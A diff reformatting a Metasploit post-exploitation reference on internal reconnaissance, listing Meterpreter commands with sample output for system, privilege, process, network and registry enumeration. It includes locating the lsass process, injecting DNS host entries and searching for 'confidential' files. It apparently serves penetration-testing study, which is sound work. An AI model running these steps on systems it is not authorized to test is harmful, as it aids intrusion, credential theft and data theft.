@@ -1,10 +1,10 @@
 # 02 - Internal Reconnaissance
 
-Search Tag: #metasploit-framework #command-and-control
+Search Tag(s): #metasploit-framework #command-and-control
 
 ## 2.1 - System
 
-* **Show hardware information of the host**
+* Show hardware information of the host
 
 ```
 meterpreter > sysinfo
@@ -17,33 +17,32 @@ Logged On Users : 2
 Meterpreter     : x64/windows
 ```
 
-* **Retrieve UUID**
+* Retrieve UUID
 
 `meterpreter > uuid`
 
-* **Get current session ID**
+* Get current session ID
 
 `meterpreter > machine_id`
 
-* **Discover Username**
+* Discover Username
  
 ```
 meterpreter > getuid
 Server username: Defalt\Winpwn10
 ```
 
-* **Discover SID**
+* Discover SID
 
 ```
 meterpreter > getsid
 Server SID: S-1-5-21-2079428845-521281716-553417191-1001
 ```
 
-* **Retrieve Privileges**
-
-`meterpreter > getprivs`
+* Retrieve Privileges
 
 ```
+meterpreter > getprivs
 Enabled Process Privileges
 ==========================
 
@@ -74,9 +73,9 @@ SeTimeZonePrivilege
 SeUndockPrivilege
 ```
 
-`meterpreter > show_mount`
 
 ```
+meterpreter > show_mount
 Mounts / Drives
 ===============
 
@@ -101,7 +100,7 @@ Local Date/Time: 2022-05-14 14:39:41.311 Pacific Daylight Time (UTC-800)
 
 ## 2.2 - Processes
 
-* **List Processes**
+### 2.2.1 - List Processes
 
 ```
 meterpreter > ps -h
@@ -179,7 +178,9 @@ Process List
 ..[snip]..
 ```
 
-* **Filter Processes**
+### 2.2.2 - Filter Processes
+
+TODO: Fill this info
 
 1. Filter to retrieve process ID
 
@@ -208,7 +209,7 @@ meterpreter > pgrep lsass
 
 ## 2.3 - Networking
 
-* **Help Menu**
+* Help Menu
 
 ```
 Stdapi: Networking Commands
@@ -226,7 +227,7 @@ Stdapi: Networking Commands
     route         View and modify the routing table
 ```
 
-* **IP Address**
+* IP Address
 
 ```
 meterpreter > ipconfig
@@ -253,7 +254,7 @@ IPv6 Address : fe80::60ca:62c2:b4fd:807a
 IPv6 Netmask : ffff:ffff:ffff:ffff::
 ```
 
-* **Netstat**
+* Netstat
 
 ```
 meterpreter > netstat
@@ -310,7 +311,7 @@ Connection list
     udp6   fe80::60ca:62c2:b4fd:807a:63857  :::*                             0     0      7044/svchost.exe
 ```
 
-* **ARP**
+* ARP
 
 ```
 meterpreter > arp
@@ -333,7 +334,7 @@ ARP cache
     255.255.255.255  ff:ff:ff:ff:ff:ff  12
 ```
 
-* **Route**
+* Route
 
 ```
 meterpreter > route -h
@@ -375,7 +376,7 @@ IPv4 network routes
 No IPv6 routes were found.
 ```
 
-* **Proxy**
+* Proxy
 
 ```
 meterpreter > getproxy
@@ -385,7 +386,7 @@ Proxy URL       :
 Proxy Bypass    :
 ```
 
-* **Resolve DNS**
+* Resolve DNS
 
 ```
 meterpreter > resolve -h
@@ -409,7 +410,7 @@ Host resolutions
     10.0.2.3  10.0.2.3
 ```
 
-* **Inject DNS Hosts**
+* Inject DNS Hosts
 
 ```
 msf > use post/windows/manage/inject_host
@@ -435,7 +436,7 @@ msf post(windows/manage/inject_host) > run
 
 ## 2.4 - Registry
 
-* **Help Menu**
+* Help Menu
 
 ```
 meterpreter > reg -h
@@ -509,7 +510,7 @@ OPTIONS:
     -r   Recursively search sub directories. (Default: true)
 ```
 
-* **Basic Commands**
+* Basic Commands
 
 `meterpreter > search -d [<drive_letter>:]/path/to/directory/ -f confidential*`
 
